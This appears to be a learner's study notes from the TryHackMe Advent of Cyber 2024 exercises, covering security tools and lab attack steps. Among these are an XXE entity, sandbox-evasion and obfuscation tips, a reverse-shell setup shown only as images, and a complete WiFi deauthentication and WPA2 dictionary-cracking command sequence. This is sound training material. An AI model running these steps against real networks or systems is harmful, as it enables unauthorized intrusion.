<h1>
  
  [Advent of Cyber 2024](https://tryhackme.com/room/adventofcyber2024)
</h1>

Challenges delivered like an advent calendar with a storyline.<br>

<h2>Tools:</h2>

Elastic - cybersecurity threat detection, investigation, and response <br>
* learned how to filter for specific events and information <br>
* can use KQL (Kibana Query Language) to search <br>

CyberChef - simple and complex data manipulation <br>
* decode encoded data <br>

Atomic Red - collection of red team test cases that can be executed to test for detection gaps <br>
* runs on powershell
* if you want to run on linux and mac install PowerShell Core
* invoke-atomictest (technique)
* parameters:
  * -ShowDetails: shows details of each test
  * -Checkprereq: check that all required resources are in place
  * -testnumbers (# of test): specify which test you want done
  * -cleanup: clean up artifacts from the test
 
Event Viewer - Windows tool that displays information about significant events happening on computer <br>

Burp Suite - Web application security testing and penetration testing. Intercepting, analyzing and modifying network traffic <br>
* Set up intercepting and modifying website requests: <br>
  * Settings -> Allow Brup's browser to run without a sandbox
  * Proxy -> Intercept -> Open Browser
  * In browser -> browse website
  * If website doesn't load change settings -> proxy -> request interception rule (all check) -> response interception rule (all check)
  * Proxy -> HTTP History
  * Find request to exploit -> send to repeater -> edit request -> Send
  * If you want to repeat exploit multiple times:
    * in request code box press ctrl+r how many times you want to execute exploit
    * click + icon and create tab group
    * send group sequence(one at a time) or parallel (at same time)
 
YARA - Tool used to identify and classify malware based on patterns in its code. Done by writing custom rules to scan for specific characteristics like particular strings, file headers, or behaviours.

Floss - Tool that extracts obfuscated strings from program
* `floss.exe (file path)`
* can pipe results to a txt file

CloudWatch - Monitors applications at multiple levels in AWS environment

CloudTrail - Monitors actions in AWS environment

JQ - transform and filter JSON data to be more understandable
* `jq '(what to filter by)' file`
* can pipe to filter more

msfvenom - generate payload and encoding it to evade detection

nc - reads and write to network conection using TCP or UDP (network listener)

Risk Assessment - identify potential problems before they happen

<h2>Languages:</h2>

XML (Extensible Markup Language) - language used to transport and store data
* Uses tags to label and organise information
* DTD (Document Type Definition) - set of rules that defines the structure of an XML document
* Entities - insertion of large chunks of data referencing internal or external files
  * ex: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
  * reference entity: `&ext;`


<h2>Commands:</h2>

Kali Linux:
* file - determines the type of file and its data
* exiftool - software used for reading, writing, and editing metadata


PowerShell:
* Select-String - find string in file (PowerShell grep equivalent)
  * `Select-String -Path "(file path)" '(string)'`

<h2>Vulnerabilities:</h2>

XXE (XML External Entity) - Takes advantage of how XML handles external entities
* GOAL: Point external entity to malicious source or code
* Intercept requests with Burp Suite
* In browser -> browse website
* Proxy -> HTTP History
* Find request to exploit -> send to repeater -> edit request -> Send

Check if machine is a sandbox environment:
* Check if it has `C:\Program Files\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProgramFilesDir`
* If missing, machine is usually on sandbox or virtual environment
* Can make script to automate

Obfuscation - encode code that executes a vulnerability using base64 or other encoding
* Be careful of FLOSS

Reverse Shell - Target initiates connection to attacking machine
![create reverse shell payload using msfvenom](https://github.com/user-attachments/assets/aaabf49a-661d-49b7-bf64-e6b505b08884)

Malicious Document that uses macro:
![Malicious Macro Document](https://github.com/user-attachments/assets/99abee96-92ca-4d68-b979-2d85d6b9ed14)

Listen for incoming connections to establish exploit:
![Listen for incoming connections to establish exploit](https://github.com/user-attachments/assets/8d877b1c-bb98-4d60-9e12-1e82c6eac25e)

Wifi Attacks:
* sudo iw dev - shows wireless devices and their configuration
* sudo iw dev (device/interface) scan - scan nearby Wifi networks using the device
* sudo iw dev (device/interface) set type monitor - change device to monitor mode
  * turn device/interface off before doing this
  * turn device/interface on after
* sudo ip link set dev (device/interface) up - turn device on
* sudo ip link set dev (device/interface) down - turn device off
* sudo iw dev (device/interface) info - shows status of device
* sudo airodump-ng (device/interface) - shows list of nearby wifi networks and important details like encryption type
  * CAN QUITE WHEN FIND DESIRED NETWORK
* sudo airodump-ng -c (# channels to listen to) --bssid (bssid of network) -w output-file (device/interface) - targets specific network channel to capture traffic and save it files that start with output-file\
  * KEEP RUNNING
* Attack device connected to access point (BSSID under STATION section)
* open second terminal to launch deauthentication attack
  * using aireplay-ng to send deauthentication packets to disconnect wifi connection
  * capture reconnection 4-way handshake using airodump-ng that is being run
  * sudo aireplay-ng -0 1 -a (device/interface) -c (BSSID of device connected to access point)
* sudo aircrack-ng -a 2 -b (device/interface) -w /home/glitch/rockyou.txt output*cap - crack WPA/WPA2 passphrase using dictionary attack (using rockyou.txt word list)
* stop airodump-ng on first terminal
* wpa_passphrase MalwareM_AP (Pass Key) > config
* sudo wpa_supplicant -B -c config -i wlan2

Timing Attack Race Conditions:
